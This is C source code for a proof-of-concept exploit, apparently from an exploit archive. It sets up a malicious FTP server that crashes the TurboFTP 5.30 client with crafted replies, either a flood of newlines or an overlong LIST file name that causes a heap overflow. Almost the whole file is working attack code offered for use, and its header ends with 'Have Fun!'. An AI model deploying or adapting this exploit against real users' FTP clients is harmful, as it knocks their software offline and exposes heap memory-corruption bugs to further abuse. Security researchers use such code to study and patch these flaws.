/***********************************************************************************

*                 TurboFTP 5.30 Build 572 Multiple Remote DoS                

       *

*                                                                            

       *

* Several vulnerabilities have been discovered in TurboFTP                   

       *

* 1) The app does not correctly handle reponses that contains 7000 newline 

chars   *

* 2) there's a heap overflow triggered by a long file name in a response to 

a LIST *

*    command                                                                 

       *

* 3) There is a heap overflow when the app sends a long CWD command          

       *

*                                                                            

       *

* Usage: TurboFTPDoS mode, mode is 1 or 2                                    

       *

*                                                                            

       *

* Only a DoS, I dont think code execution is possible                        

       *

*                                                                            

       *

* Have Fun!                                                                  

       *

*                                                                            

       *

* Coded by Marsu <Marsupilamipowa@hotmail.fr>                                

       *

***********************************************************************************/







#include "winsock2.h"

#include "stdio.h"

#include "stdlib.h"

#include "windows.h"

#pragma comment(lib, "ws2_32.lib")



int main(int argc, char* argv[])

{

	char recvbuff[1024];

	char evilbuff[30000];

	sockaddr_in sin;

	int server,client;

	int mode;

	WSADATA wsaData;

	WSAStartup(MAKEWORD(1,1), &wsaData);



	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	sin.sin_family = PF_INET;

	sin.sin_addr.s_addr = htonl(INADDR_ANY);

	sin.sin_port = htons( 21 );

	bind(server,(SOCKADDR*)&sin,sizeof(sin));





	printf("[+] TurboFTP 5.30 Build 572 Multiple Remote DoS\n");

	printf("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");

	if (argc<2)

	{

		printf("[+] Usage: %s mode, mode is 1 or 2\n",argv[0]);

		return 0;

	}



	mode = atoi(argv[1]);

	printf("[*] Listening on port 21 ...\n");

	listen(server,5);

	printf("[*] Waiting for client ...\n");

	client=accept(server,NULL,NULL);

	printf("[+] Client connected\n");



    memset(recvbuff,'\0',1024);

	if (mode==1) {

		memset(evilbuff,10,7000);

		memcpy(evilbuff,"220 Hello there",15);

		memcpy(evilbuff+7000,"\r\n\0",3);

	}

	else

		memcpy(evilbuff,"220 Hello there\r\n\0",18);



	if (send(client,evilbuff,strlen(evilbuff),0)==-1)

	{

		printf("[-] Error in send!\n");

		exit(-1);

	}



	//USER

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	if (mode==1) {

		memset(evilbuff,10,7000);

		memcpy(evilbuff,"331 ",4);

		memcpy(evilbuff+7000,"\r\n\0",3);

	}

	else

	    memcpy(evilbuff,"331 \r\n\0",7);



	send(client,evilbuff,strlen(evilbuff),0);



	if (mode==1) {

		printf("[+] Waiting for a few seconds ...\n");

		Sleep(4000);

		printf("[+] Must be 100%% CPU consuming\n");

		return 0;

	}



	//PASS

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"230 \r\n\0",7);

	send(client,evilbuff,strlen(evilbuff),0);



	//SYST

	memset(recvbuff,'\0',1024);

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"215 WINDOWS\r\n\0",14);

	send(client,evilbuff,strlen(evilbuff),0);



	//FEAT

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"211 END\r\n\0",10);

	send(client,evilbuff,strlen(evilbuff),0);



	//REST 100

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"350 rest at 100\r\n\0",10);

	send(client,evilbuff,strlen(evilbuff),0);



	//REST 0

    memset(recvbuff,'\0',1024);

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"350 rest at 0\r\n\0",10);

	send(client,evilbuff,strlen(evilbuff),0);



	//PWD

	memset(recvbuff,'\0',1024);

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"257 \"dir/\"\r\n\0",13);

    send(client,evilbuff,strlen(evilbuff),0);



	//TYPE A

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"200 \r\n\0",10);

	send(client,evilbuff,strlen(evilbuff),0);



	//PASV

	memset(recvbuff,'\0',1024);

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	memcpy(evilbuff,"227 Entering Passive Mode (127,0,0,1,40,0)\r\n\0", 45); 

//127.0.0.1:10200



	send(client,evilbuff,strlen(evilbuff),0);

	int ListenSock= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in sin2;

	sin2.sin_family = AF_INET;

	sin2.sin_addr.s_addr = htonl(INADDR_ANY);

	sin2.sin_port = htons( 10240 );

	bind(ListenSock,(SOCKADDR*)&sin2,sizeof(sin2));

	printf("[*] Waiting for data connection ...\n");

	listen(ListenSock,5);

	int DATAClient=accept(ListenSock,NULL,NULL);

	printf("[+] Client connected\n");



	//LIST

	recv(client,recvbuff,1024,0);

	printf("%s", recvbuff);

	int len=700;

	memset(evilbuff,'A',len);

	memcpy(evilbuff,"-rw-rw-rw-   1 ftp      ftp    1777         Jan 30 12:14 

T",58);

	memcpy(evilbuff+len,"\r\n\0",3);

	send(DATAClient,evilbuff,strlen(evilbuff),0);



	//Close control connection

	memcpy(evilbuff,"150 Opening data connection for directory 

list.\r\n\0",60);

    send(client,evilbuff,strlen(evilbuff),0);

	memcpy(evilbuff,"226 OK\r\n",9);

	send(client,evilbuff,strlen(evilbuff),0);

	closesocket(DATAClient);



	printf("[+] Evil list sent\n");

	closesocket(client);

	closesocket(server); //bug is triggered there



	printf("[+] TurboFTP is out\n");

	return 0;

}
